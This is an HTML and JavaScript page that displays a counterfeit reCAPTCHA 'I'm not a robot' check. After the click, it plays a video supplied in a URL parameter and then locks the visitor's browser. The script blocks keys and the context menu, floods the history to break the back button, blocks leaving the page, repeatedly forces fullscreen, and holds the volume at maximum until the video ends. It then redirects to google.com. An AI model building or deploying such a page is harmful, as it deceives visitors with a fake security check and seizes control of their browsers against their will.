<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verification Required</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      user-select: none;
      -webkit-user-select: none;
      -webkit-touch-callout: none;
    }

    html, body {
      width: 100%;
      height: 100%;
      background: #f9f9f9;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }

    #verifyScreen {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      background: #f9f9f9;
      z-index: 100;
    }

    #title {
      font-size: 18px;
      color: #333;
      margin-bottom: 24px;
      text-align: center;
      padding: 0 20px;
    }

    .captcha-box {
      width: 300px;
      height: 74px;
      background: #f9f9f9;
      border: 1px solid #d3d3d3;
      border-radius: 3px;
      display: flex;
      align-items: center;
      padding: 0 12px;
      cursor: pointer;
    }

    .checkbox-wrapper {
      width: 28px;
      height: 28px;
      border: 2px solid #c1c1c1;
      border-radius: 2px;
      background: white;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 12px;
    }

    .checkmark {
      width: 22px;
      height: 22px;
      display: none;
    }
    .checkmark.show { display: block; }

    .spinner {
      width: 24px;
      height: 24px;
      border: 3px solid #e0e0e0;
      border-top: 3px solid #4285f4;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      display: none;
    }
    .spinner.show { display: block; }

    @keyframes spin { to { transform: rotate(360deg); } }

    .captcha-label { flex: 1; font-size: 14px; color: #000; }

    .captcha-logo {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-left: 8px;
    }

    .logo-img { width: 32px; height: 32px; }
    .logo-text { font-size: 8px; color: #555; font-weight: bold; }
    .logo-sub { font-size: 7px; color: #999; }

    #errorScreen {
      display: none;
      position: fixed;
      inset: 0;
      background: white;
      z-index: 999;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 20px;
      text-align: center;
    }

    #errorScreen h1 {
      font-size: 60px;
      color: #ccc;
    }

    #errorScreen p {
      font-size: 18px;
      color: #555;
      margin-top: 10px;
    }

    #playScreen {
      display: none;
      position: fixed;
      inset: 0;
      background: black;
      z-index: 150;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      cursor: pointer;
    }

    #playButton {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      background: rgba(255,255,255,0.2);
      border: 3px solid white;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: pulse 1.5s infinite;
    }

    #playButton::before {
      content: "";
      width: 0;
      height: 0;
      border-left: 30px solid white;
      border-top: 20px solid transparent;
      border-bottom: 20px solid transparent;
      margin-left: 8px;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }

    #playText {
      color: white;
      font-size: 18px;
      margin-top: 20px;
    }

    #videoScreen {
      display: none;
      position: fixed;
      inset: 0;
      background: black;
      z-index: 200;
    }

    #myVideo {
      width: 100%;
      height: 100%;
      object-fit: contain;
      background: black;
      display: block;
    }
  </style>
</head>
<body>

  <div id="errorScreen">
    <h1>404</h1>
    <p>Page not found</p>
  </div>

  <div id="verifyScreen">
    <p id="title">Please verify you are human to continue</p>
    <div class="captcha-box" id="captchaBox">
      <div class="checkbox-wrapper">
        <div class="spinner" id="spinner"></div>
        <svg class="checkmark" id="checkmark" viewBox="0 0 24 24" fill="none">
          <path d="M5 12l5 5L20 7" stroke="#4caf50" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <span class="captcha-label">I'm not a robot</span>
      <div class="captcha-logo">
        <svg class="logo-img" viewBox="0 0 48 48">
          <path fill="#4285f4" d="M24 4C16 4 9 9 7 17l7 2c1-5 5-8 10-8 4 0 7 2 9 5l-6 6h17V5l-6 6c-3-4-8-7-14-7z"/>
          <path fill="#9e9e9e" d="M24 44c8 0 15-5 17-13l-7-2c-1 5-5 8-10 8-4 0-7-2-9-5l6-6H4v17l6-6c3 4 8 7 14 7z"/>
        </svg>
        <div class="logo-text">reCAPTCHA</div>
        <div class="logo-sub">Privacy - Terms</div>
      </div>
    </div>
  </div>

  <div id="playScreen">
    <div id="playButton"></div>
    <div id="playText">Tap to continue</div>
  </div>

  <div id="videoScreen">
    <video id="myVideo" playsinline webkit-playsinline preload="auto"></video>
  </div>

  <script>
    const errorScreen  = document.getElementById("errorScreen");
    const verifyScreen = document.getElementById("verifyScreen");
    const captchaBox   = document.getElementById("captchaBox");
    const spinner      = document.getElementById("spinner");
    const checkmark    = document.getElementById("checkmark");
    const playScreen   = document.getElementById("playScreen");
    const videoScreen  = document.getElementById("videoScreen");
    const video        = document.getElementById("myVideo");

    const REDIRECT_URL = "https://www.google.com";

    let videoStarted = false;
    let captchaUsed  = false;

    const params   = new URLSearchParams(window.location.search);
    const videoUrl = params.get("v");

    if (!videoUrl) {
      verifyScreen.style.display = "none";
      errorScreen.style.display  = "flex";
    } else {
      video.src = videoUrl;
    }

    captchaBox.addEventListener("click", async () => {
      if (captchaUsed) return;
      captchaUsed = true;
      spinner.classList.add("show");
      await new Promise(r => setTimeout(r, 1500));
      spinner.classList.remove("show");
      checkmark.classList.add("show");
      await new Promise(r => setTimeout(r, 500));
      tryStart();
    });

    async function tryStart() {
      verifyScreen.style.display = "none";

      try {
        await requestFS();
        video.muted = false;
        video.volume = 1.0;
        await video.play();
        videoScreen.style.display = "block";
        videoStarted = true;
        activateLocks();
        return;
      } catch(e) { console.log("Direct failed:", e); }

      try {
        video.muted = true;
        await video.play();
        videoScreen.style.display = "block";
        videoStarted = true;
        setTimeout(() => {
          video.muted = false;
          video.volume = 1.0;
        }, 300);
        try { await requestFS(); } catch(e) {}
        activateLocks();
        return;
      } catch(e) { console.log("Muted failed:", e); }

      playScreen.style.display = "flex";
    }

    playScreen.addEventListener("click", async () => {
      playScreen.style.display = "none";
      videoScreen.style.display = "block";
      videoStarted = true;
      try { await requestFS(); } catch(e) {}
      try {
        video.muted = false;
        video.volume = 1.0;
        await video.play();
      } catch(e) {
        try {
          video.muted = true;
          await video.play();
          setTimeout(() => {
            video.muted = false;
            video.volume = 1.0;
          }, 300);
        } catch(e2) {}
      }
      activateLocks();
    });

    function requestFS() {
      const el = document.documentElement;
      if (el.requestFullscreen)        return el.requestFullscreen();
      if (el.webkitRequestFullscreen)  return el.webkitRequestFullscreen();
      if (el.mozRequestFullScreen)     return el.mozRequestFullScreen();
      if (el.msRequestFullscreen)      return el.msRequestFullscreen();
      return Promise.reject("No FS");
    }

    function isFS() {
      return !!(document.fullscreenElement ||
                document.webkitFullscreenElement ||
                document.mozFullScreenElement ||
                document.msFullscreenElement);
    }

    function exitFS() {
      if (document.exitFullscreen)        return document.exitFullscreen();
      if (document.webkitExitFullscreen)  return document.webkitExitFullscreen();
      if (document.mozCancelFullScreen)   return document.mozCancelFullScreen();
      if (document.msExitFullscreen)      return document.msExitFullscreen();
    }

    video.addEventListener("ended", () => {
      videoStarted = false;
      try { if (isFS()) exitFS(); } catch(e) {}
      window.location.href = REDIRECT_URL;
    });

    function activateLocks() {
      document.addEventListener("keydown", blockKey, true);
      document.addEventListener("keyup", blockKey, true);
      document.addEventListener("keypress", blockKey, true);

      document.addEventListener("contextmenu", (e) => {
        e.preventDefault();
        return false;
      }, true);

      for (let i = 0; i < 20; i++) {
        history.pushState(null, "", location.href);
      }

      window.addEventListener("popstate", () => {
        if (videoStarted && !video.ended) {
          history.pushState(null, "", location.href);
          history.pushState(null, "", location.href);
        }
      });

      window.addEventListener("beforeunload", (e) => {
        if (videoStarted && !video.ended) {
          e.preventDefault();
          e.returnValue = "";
          return "";
        }
      });

      const fsEvents = ["fullscreenchange", "webkitfullscreenchange", "mozfullscreenchange", "MSFullscreenChange"];
      fsEvents.forEach(evt => {
        document.addEventListener(evt, () => {
          if (!isFS() && videoStarted && !video.ended) {
            setTimeout(() => requestFS().catch(() => {}), 100);
            setTimeout(() => requestFS().catch(() => {}), 500);
            setTimeout(() => requestFS().catch(() => {}), 1500);
          }
        });
      });

      document.addEventListener("visibilitychange", () => {
        if (videoStarted && !video.ended) {
          if (document.hidden) {
            video.pause();
          } else {
            requestFS().catch(() => {});
            video.volume = 1.0;
            video.muted = false;
            video.play().catch(() => {});
          }
        }
      });

      window.addEventListener("blur", () => {
        if (videoStarted && !video.ended) {
          setTimeout(() => {
            window.focus();
            requestFS().catch(() => {});
            video.play().catch(() => {});
          }, 100);
        }
      });

      video.addEventListener("volumechange", () => {
        if (videoStarted && !video.ended) {
          video.volume = 1.0;
          video.muted = false;
        }
      });

      document.addEventListener("touchmove", (e) => {
        if (videoStarted && !video.ended) e.preventDefault();
      }, { passive: false });

      document.addEventListener("wheel", (e) => {
        if (videoStarted && !video.ended) e.preventDefault();
      }, { passive: false });

      setInterval(() => {
        if (videoStarted && !video.ended) {
          video.volume = 1.0;
          video.muted = false;
          if (video.paused) video.play().catch(() => {});
          if (!isFS()) requestFS().catch(() => {});
        }
      }, 1000);
    }

    function blockKey(e) {
      if (!videoStarted || video.ended) return;
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    }
  </script>

</body>
</html>
